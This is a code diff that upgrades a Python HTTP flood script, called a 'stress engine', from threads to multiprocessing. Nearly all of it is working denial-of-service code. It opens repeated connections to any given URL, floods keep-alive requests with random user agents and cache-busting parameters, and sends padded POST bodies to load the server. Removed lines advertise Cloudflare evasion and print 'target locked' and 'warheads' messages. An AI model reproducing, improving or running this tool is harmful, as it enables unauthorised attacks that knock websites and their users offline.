@@ -1,22 +1,13 @@
 import sys
-import threading
+import multiprocessing
 import time
 import random
 import string
-import urllib.request
-import urllib.error
 import socket
+import ssl
 
-# Monster Stres Engine V2 (Cyberpunk Edition)
+# Monster Stres Engine V4 (Turbo Multi-Processing Edition)
 # Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>
-
-# Modes:
-# 1: NORMAL (Standard Request)
-# 2: BYPASS_CF (Cloudflare Evasion - UserAgents + Referers)
-# 3: BYPASS_CACHE (Random Query Params)
-# 4: KILL_ALL (Mixed)
-
-print("[DEBUG] PYTHON ENGINE LOADED", flush=True)
 
 USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
@@ -26,28 +17,12 @@ USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36 Edg/99.0.1150.36"
 ]
 
-REFERERS = [
-    "https://www.google.com/",
-    "https://www.bing.com/",
-    "https://duckduckgo.com/",
-    "https://www.facebook.com/",
-    "https://twitter.com/"
-]
-
 def get_random_string(length=8):
     letters = string.ascii_letters + string.digits
     return ''.join(random.choice(letters) for i in range(length))
 
-# Shared Counter
-TOTAL_REQUESTS = 0
-TOTAL_BYTES_SENT = 0
-TOTAL_ERRORS = 0
-LAST_ERROR = "None"
-
-def attack(target_url, end_time, thread_id, port, mode):
-    global TOTAL_REQUESTS, TOTAL_BYTES_SENT, TOTAL_ERRORS, LAST_ERROR
-    
-    # Parse Host structure
+def attack_proc(target_url, end_time, port, mode, shared_req, shared_bytes, shared_err):
+    # Process-Local Pre-computation
     try:
         from urllib.parse import urlparse
         parsed = urlparse(target_url)
@@ -59,15 +34,10 @@ def attack(target_url, end_time, thread_id, port, mode):
         path = "/"
         scheme = "http"
 
-    # Resolve Port
     if port == '80' and scheme == 'https': target_port = 443
     elif port: target_port = int(port)
     else: target_port = 443 if scheme == 'https' else 80
 
-    import ssl
-    import socket
-
-    # Pre-build Headers (Base)
     common_headers = (
         f"Host: {host}\r\n"
         f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
@@ -75,21 +45,18 @@ def attack(target_url, end_time, thread_id, port, mode):
         "Accept-Language: en-US,en;q=0.5\r\n"
         "Connection: keep-alive\r\n"
         "Upgrade-Insecure-Requests: 1\r\n"
-        "Cache-Control: no-cache\r\n" # Force server work
+        "Cache-Control: no-cache\r\n"
         "Pragma: no-cache\r\n"
     )
 
-    # PRE-COMPUTE RANDOM POOL to save CPU
-    RANDOM_POOL = [get_random_string(8) for _ in range(1000)]
+    RANDOM_POOL = [get_random_string(8) for _ in range(500)]
 
     while time.time() < end_time:
         s = None
         try:
-            # 1. Establish Connection
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(4) 
             
-            # Wrap SSL if HTTPS
             if scheme == 'https' or target_port == 443:
                 ctx = ssl.create_default_context()
                 ctx.check_hostname = False
@@ -98,149 +65,83 @@ def attack(target_url, end_time, thread_id, port, mode):
             
             s.connect((host, target_port))
             
-            # 2. INFINITE FLOOD on Single Connection
             while time.time() < end_time:
-                
-                # Fast Path Selection
                 curr_path = path
                 method = "GET"
                 post_data = ""
                 
                 if mode == '3' or mode == '4':
-                    rnd = RANDOM_POOL[TOTAL_REQUESTS % 1000]
+                    rnd = RANDOM_POOL[random.randint(0, 499)]
                     sep = '&' if '?' in curr_path else '?'
                     curr_path = f"{path}{sep}t={rnd}"
                 
-                # KILLER MODE: Randomized POST (Much heavier than GET)
-                if mode == '4' and TOTAL_REQUESTS % 2 == 0:
+                if mode == '4' and random.random() > 0.5:
                     method = "POST"
-                    post_data = get_random_string(random.randint(500, 2000)) # Heavy Body
+                    post_data = get_random_string(random.randint(500, 1500))
                 
-                # Construct Payload
-                payload_str = (
-                    f"{method} {curr_path} HTTP/1.1\r\n" +
-                    common_headers
-                )
-                
+                payload_str = f"{method} {curr_path} HTTP/1.1\r\n{common_headers}"
                 if method == "POST":
-                    payload_str += f"Content-Length: {len(post_data)}\r\n"
-                    payload_str += "Content-Type: application/x-www-form-urlencoded\r\n"
-                    payload_str += "\r\n" + post_data
+                    payload_str += f"Content-Length: {len(post_data)}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{post_data}"
                 else:
                     payload_str += "\r\n"
 
                 payload = payload_str.encode('utf-8')
-
-                # Send
                 s.sendall(payload)
                 
-                # Update Stats
-                TOTAL_BYTES_SENT += len(payload)
-                TOTAL_REQUESTS += 1
+                # Update Shared Stats (Locked for safety)
+                with shared_req.get_lock(): shared_req.value += 1
+                with shared_bytes.get_lock(): shared_bytes.value += len(payload)
                 
-        except Exception as e:
-            TOTAL_ERRORS += 1
-            LAST_ERROR = str(e)
-            # Break connection loop on error to reconnect
+        except:
+            with shared_err.get_lock(): shared_err.value += 1
         finally:
             if s: 
                 try: s.close()
                 except: pass
-
-# ... (Main function kept same mostly) ...
-
-    # Live Monitor
-    start_time = time.time()
-    last_bytes_check = 0
-    
-    while time.time() < end_time:
-        time.sleep(1)
-        elapsed = int(time.time() - start_time)
-        
-        # Calculate Speed
-        current_bytes = TOTAL_BYTES_SENT
-        bytes_delta = current_bytes - last_bytes_check
-        mbps = (bytes_delta * 8) / (1024 * 1024) # Bits / Meg
-        last_bytes_check = current_bytes
-        
-        # Print Status with Errors
-        err_msg = ""
-        if TOTAL_ERRORS > 0:
-            err_msg = f" | ERRORS: {TOTAL_ERRORS} ({LAST_ERROR})"
-
-        print(f"PROGRESS:{elapsed}:{duration} | SPEED: {mbps:.2f} Mbps{err_msg}") 
-        sys.stdout.flush()
 
 def main():
     if len(sys.argv) < 6:
         print("Usage: python3 stress_engine.py <URL> <THREADS> <DURATION> <PORT> <MODE>")
         sys.exit(1)
 
-    url = sys.argv[1]
-    threads_count = int(sys.argv[2])
-    duration = int(sys.argv[3])
-    port = sys.argv[4]
-    mode = sys.argv[5]
+    url, th_count, duration, port, mode = sys.argv[1:6]
+    th_count, duration = int(th_count), int(duration)
 
-    # Ensure URL Scheme
-    if not url.startswith('http'):
-        url = 'http://' + url
+    if not url.startswith('http'): url = 'http://' + url
 
-    # Parse Host for display
-    try:
-        from urllib.parse import urlparse
-        parsed = urlparse(url)
-        host = parsed.netloc
-    except:
-        host = url
+    # SHARED MEMORY FOR STATS
+    shared_req = multiprocessing.Value('i', 0)
+    shared_bytes = multiprocessing.Value('L', 0)
+    shared_err = multiprocessing.Value('i', 0)
 
-    print(f"[*] TARGET LOCKED: {host} (PORT: {port})")
-    print(f"[*] MODE: {get_mode_name(mode)}")
-    print(f"[*] THREADS: {threads_count} | DURATION: {duration}s")
-    print(f"[*] DEPLOYING {threads_count} WARHEADS...")
-    print("-" * 40)
+    print(f"[*] DEPLOYING {th_count} SYSTEM PROCESSES...")
     sys.stdout.flush()
 
     end_time = time.time() + duration
-    threads = []
+    processes = []
 
-    for i in range(threads_count):
-        t = threading.Thread(target=attack, args=(url, end_time, i, port, mode))
-        t.daemon = True
-        t.start()
-        threads.append(t)
+    for _ in range(th_count):
+        p = multiprocessing.Process(target=attack_proc, args=(url, end_time, port, mode, shared_req, shared_bytes, shared_err))
+        p.daemon = True
+        p.start()
+        processes.append(p)
 
-    # Live Monitor
+    # Monitor
     start_time = time.time()
-    last_bytes_check = 0
-    
+    last_bytes = 0
     while time.time() < end_time:
         time.sleep(1)
         elapsed = int(time.time() - start_time)
         
-        # Calculate Speed
-        current_bytes = TOTAL_BYTES_SENT
-        bytes_delta = current_bytes - last_bytes_check
-        mbps = (bytes_delta * 8) / (1024 * 1024) # Bits / Meg
-        last_bytes_check = current_bytes
+        curr_bytes = shared_bytes.value
+        mbps = ((curr_bytes - last_bytes) * 8) / (1024 * 1024)
+        last_bytes = curr_bytes
         
-        # Print Status with Errors
-        err_msg = ""
-        if TOTAL_ERRORS > 0:
-            err_msg = f" | ERRORS: {TOTAL_ERRORS} ({LAST_ERROR})"
-
-        print(f"PROGRESS:{elapsed}:{duration} | REQ: {TOTAL_REQUESTS} | SPEED: {mbps:.2f} Mbps{err_msg}") 
+        print(f"PROGRESS:{elapsed}:{duration} | REQ: {shared_req.value} | SPEED: {mbps:.2f} Mbps | ERRORS: {shared_err.value}")
         sys.stdout.flush()
 
-    print("-" * 40)
-    print("[*] MISSION COMPLETE. SYSTEM COOLING DOWN.")
-
-def get_mode_name(mode):
-    if mode == '1': return "BASIC HTTP REQUEST"
-    if mode == '2': return "BROWSER EMULATION (HTTP 403 BYPASS)"
-    if mode == '3': return "RANDOM PATTERNS (CACHE BYPASS)"
-    if mode == '4': return "FULL STRESS TEST (MIXED)"
-    return "UNKNOWN"
+    for p in processes: p.terminate()
+    print("-" * 40 + "\n[*] MISSION COMPLETE.")
 
 if __name__ == "__main__":
     main()
